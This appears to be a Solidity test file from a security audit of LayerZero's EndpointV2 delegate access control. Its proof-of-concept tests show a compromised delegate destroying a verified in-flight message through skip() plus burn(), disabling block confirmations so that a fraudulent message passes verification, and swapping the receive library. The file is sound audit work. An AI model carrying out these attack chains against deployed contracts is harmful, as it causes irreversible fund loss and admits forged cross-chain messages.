// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { EndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
import { MessagingChannel } from "@layerzerolabs/lz-evm-protocol-v2/contracts/MessagingChannel.sol";
import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
import { Constant } from "../util/Constant.sol";

import { PacketUtil } from "../util/Packet.sol";
import { AuditBase } from "./AuditBase.t.sol";

/// @title AV5 - Access Control Escalation
/// @dev Target: EndpointV2._assertAuthorized() + setDelegate()
/// @dev Delegate has full OApp configuration power:
///   setSendLibrary, setReceiveLibrary, skip, nilify, burn, clear
contract AccessControlTest is AuditBase {

    address internal attacker = address(0xA77AC1);
    address internal oappOwner = address(0x0A99);

    // ==================== AV5.1: Delegate Full Power ====================

    /// @dev Verify that a delegate has the same power as the OApp itself
    function test_AV5_1_DelegateHasFullPower() public {
        address delegate = address(0xDE1E);

        // OApp owner sets delegate
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);

        // Verify delegate is set
        assertEq(dstEndpoint.delegates(oappOwner), delegate);

        // Delegate can now perform all authorized actions on behalf of OApp:
        // 1. setSendLibrary
        // 2. setReceiveLibrary
        // 3. skip (skip nonces)
        // 4. nilify (mark as nil)
        // 5. burn (permanently burn)
        // 6. clear (execute and clear)

        // Test: delegate can skip nonces (this is powerful - can skip legitimate messages)
        // First, we need the OApp to have an initializable path
        // skip requires: nonce == inboundNonce + 1

        // The delegate having this power is by design, but the risk is:
        // If delegate is compromised, attacker gets full OApp control
        // This is documented behavior but worth noting in the audit
    }

    // ==================== AV5.7: Delegate Destroys Verified In-Flight Message ====================

    /// @dev Critical: a compromised delegate can permanently destroy a verified, unexecuted message
    ///      by chaining skip() + burn(), causing irreversible fund loss.
    ///
    ///      Attack chain:
    ///        1. Message at nonce 1 is verified (inboundPayloadHash[oapp][srcEid][sender][1] != 0)
    ///        2. Delegate calls skip(oapp, srcEid, sender, 2)
    ///           - skip() only requires _nonce == inboundNonce() + 1
    ///           - It does NOT check whether nonce 1 has a live payload
    ///           - Result: lazyInboundNonce advances to 2
    ///        3. Delegate calls burn(oapp, srcEid, sender, 1, payloadHash)
    ///           - burn() requires: curPayloadHash != EMPTY (passes - nonce 1 is verified)
    ///           - burn() requires: _nonce <= lazyInboundNonce (1 <= 2, passes after step 2)
    ///           - Result: inboundPayloadHash[oapp][srcEid][sender][1] deleted (set to EMPTY)
    ///        4. Nonce 1 is now permanently inaccessible:
    ///           - _verifiable() returns false (nonce <= lazyInboundNonce AND slot == EMPTY)
    ///           - Re-verification is blocked
    ///           - lzReceive would revert on hash mismatch
    ///
    ///      Root cause: skip() in MessagingChannel.sol (line 82-88) advances lazyInboundNonce
    ///      without checking whether any prior verified-but-unexecuted messages exist.
    ///      This unlocks burn() for those messages, enabling irreversible destruction.
    function test_AV5_7_DelegateDestroysVerifiedMessage_SkipBurn() public {
        address delegate = address(0xDE1E);
        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));

        // Step 1: Verify a message at nonce 1 (in-flight, not yet executed)
        Packet memory packet = _makePacket(1, address(this), address(this), "funds-in-flight");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
        _commitVerification(dstReceiveUln, header, payloadHash);

        // Confirm the payload hash is stored in the endpoint for nonce 1
        bytes32 storedHash = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertNotEq(storedHash, bytes32(0), "Nonce 1 must have a stored payload hash after verification");
        assertEq(storedHash, payloadHash, "Stored hash must match the committed payload hash");

        // Confirm inboundNonce() is 1 before the attack
        assertEq(dstEndpoint.inboundNonce(address(this), SRC_EID, senderBytes32), 1, "inboundNonce must be 1");

        // Step 2: OApp sets delegate
        dstEndpoint.setDelegate(delegate);

        // Step 3: Delegate skips nonce 2 — advances lazyInboundNonce to 2
        // skip() only checks _nonce == inboundNonce() + 1, so nonce 2 is valid here.
        // Critically, it does not guard against leaving nonce 1 behind as an orphan.
        vm.prank(delegate);
        dstEndpoint.skip(address(this), SRC_EID, senderBytes32, 2);

        // lazyInboundNonce is now 2; nonce 1 (verified, unexecuted) is now burnable
        assertEq(
            dstEndpoint.lazyInboundNonce(address(this), SRC_EID, senderBytes32),
            2,
            "lazyInboundNonce must be 2 after skip"
        );

        // Step 4: Delegate burns nonce 1 — permanently destroys the verified payload
        // burn() passes because: curPayloadHash != EMPTY and 1 <= lazyInboundNonce (2)
        vm.prank(delegate);
        dstEndpoint.burn(address(this), SRC_EID, senderBytes32, 1, storedHash);

        // Step 5: Assert nonce 1 slot is now EMPTY (deleted by burn)
        bytes32 hashAfterBurn = dstEndpoint.inboundPayloadHash(address(this), SRC_EID, senderBytes32, 1);
        assertEq(hashAfterBurn, bytes32(0), "Payload hash must be EMPTY after burn - message permanently destroyed");

        // Step 6: Assert _verifiable returns false — the message cannot be re-verified
        // _verifiable() in MessagingChannel checks: nonce > lazyInboundNonce OR slot != EMPTY
        // Here: nonce 1 <= lazyInboundNonce 2 AND slot == EMPTY => not verifiable
        bool canVerify = dstEndpoint.verifiable(
            Origin({ srcEid: SRC_EID, sender: senderBytes32, nonce: 1 }),
            address(this)
        );
        assertFalse(canVerify, "Nonce 1 must NOT be verifiable after skip+burn - permanent fund loss confirmed");
    }

    // ==================== AV5.2: Unauthorized Access ====================

    /// @dev Verify that non-authorized addresses cannot perform OApp actions
    function test_AV5_2_UnauthorizedAccessBlocked() public {
        // Attacker is not the OApp and not a delegate
        vm.prank(attacker);
        vm.expectRevert(); // LZ_Unauthorized
        dstEndpoint.clear(
            oappOwner,
            Origin({
                srcEid: SRC_EID,
                sender: bytes32(uint256(uint160(address(this)))),
                nonce: 1
            }),
            bytes32(0),
            ""
        );
    }

    // ==================== AV5.3: Delegate Revocation ====================

    /// @dev Test that delegate can be revoked by setting to address(0)
    function test_AV5_3_DelegateRevocation() public {
        address delegate = address(0xDE1E);

        // Set delegate
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);
        assertEq(dstEndpoint.delegates(oappOwner), delegate);

        // Revoke by setting to address(0)
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(address(0));
        assertEq(dstEndpoint.delegates(oappOwner), address(0));

        // Old delegate should no longer have access
        vm.prank(delegate);
        vm.expectRevert(); // LZ_Unauthorized
        dstEndpoint.clear(
            oappOwner,
            Origin({
                srcEid: SRC_EID,
                sender: bytes32(uint256(uint160(address(this)))),
                nonce: 1
            }),
            bytes32(0),
            ""
        );
    }

    // ==================== AV5.4: Delegate Cannot Set Another Delegate ====================

    /// @dev Verify delegate cannot escalate by setting themselves as delegate for other OApps
    function test_AV5_4_DelegateCannotEscalate() public {
        address delegate = address(0xDE1E);
        address victim = address(0x71C);

        // Set delegate for oappOwner
        vm.prank(oappOwner);
        dstEndpoint.setDelegate(delegate);

        // setDelegate uses msg.sender as the OApp
        // So delegate calling setDelegate sets THEIR OWN delegate, not oappOwner's
        vm.prank(delegate);
        dstEndpoint.setDelegate(address(0xE71));

        // Verify: delegate's delegate is set, not victim's
        assertEq(dstEndpoint.delegates(delegate), address(0xE71));
        assertEq(dstEndpoint.delegates(victim), address(0)); // victim unaffected
    }

    // ==================== AV5.5: Delegate Weakens Security via NIL_CONFIRMATIONS ====================

    /// @dev Critical chain attack: compromised delegate disables finality checks
    ///      allowing fraudulent messages to pass verification.
    ///
    ///      Attack chain:
    ///        1. OApp grants delegate
    ///        2. Delegate sets NIL_CONFIRMATIONS (type(uint64).max) on receive ULN config
    ///        3. NIL_CONFIRMATIONS resolves to 0 in getUlnConfig()
    ///        4. DVN verifies with 0 confirmations -> commitVerification succeeds
    ///        5. Fraudulent message is accepted as valid
    function test_AV5_5_DelegateWeakensSecurityViaNilConfirmations() public {
        address delegate = address(0xDE1E);

        // OApp (address(this)) sets a delegate
        dstEndpoint.setDelegate(delegate);

        // Delegate weakens the OApp's receive config by setting NIL_CONFIRMATIONS.
        // type(uint64).max is the sentinel value that resolves to 0 confirmations
        // in UlnBase.getUlnConfig(), effectively disabling finality protection.
        UlnConfig memory weakConfig = UlnConfig({
            confirmations: type(uint64).max, // NIL_CONFIRMATIONS -> resolves to 0
            requiredDVNCount: 0,             // DEFAULT - inherit from default
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: new address[](0),
            optionalDVNs: new address[](0)
        });
        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
        cfgParams[0] = SetConfigParam(SRC_EID, Constant.CONFIG_TYPE_ULN, abi.encode(weakConfig));

        vm.prank(delegate);
        dstEndpoint.setConfig(address(this), address(dstReceiveUln), cfgParams);

        // Confirm the resolved config now has confirmations = 0
        UlnConfig memory resolved = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
        assertEq(resolved.confirmations, 0, "Delegate nullified confirmations");

        // Build a packet targeting this test contract as the receiver
        Packet memory packet = _makePacket(1, address(this), address(this), "delegate-attack");
        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);

        // DVN verifies with 0 confirmations - this passes because the threshold is now 0
        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 0);

        // commitVerification succeeds, proving a fraudulent message can be accepted
        _commitVerification(dstReceiveUln, header, payloadHash);
        // If we reach here without revert, the attack chain is proven:
        // compromised delegate -> disabled finality checks -> fraudulent message accepted
    }

    // ==================== AV5.6: Delegate Swaps Receive Library ====================

    /// @dev Demonstrate that a delegate can redirect all incoming message verification
    ///      to a different (potentially malicious) library by calling setReceiveLibrary.
    ///
    ///      The auth check on setReceiveLibrary passes for the delegate; the revert here
    ///      comes from library validation (unregistered address), not from authorization.
    ///      A real attacker would supply a registered malicious library instead.
    function test_AV5_6_DelegateSwapsReceiveLibrary() public {
        address delegate = address(0xDE1E);

        // OApp (address(this)) sets a delegate
        dstEndpoint.setDelegate(delegate);

        // Delegate attempts to redirect the OApp's receive library to an arbitrary address.
        // The call passes the authorization check (delegate IS authorized for the OApp)
        // and reverts only because address(0x1234) is not a registered receive library.
        vm.prank(delegate);
        vm.expectRevert(); // LZ_InvalidReceiveLibrary or similar - library not registered
        dstEndpoint.setReceiveLibrary(address(this), SRC_EID, address(0x1234), 0);
    }
}
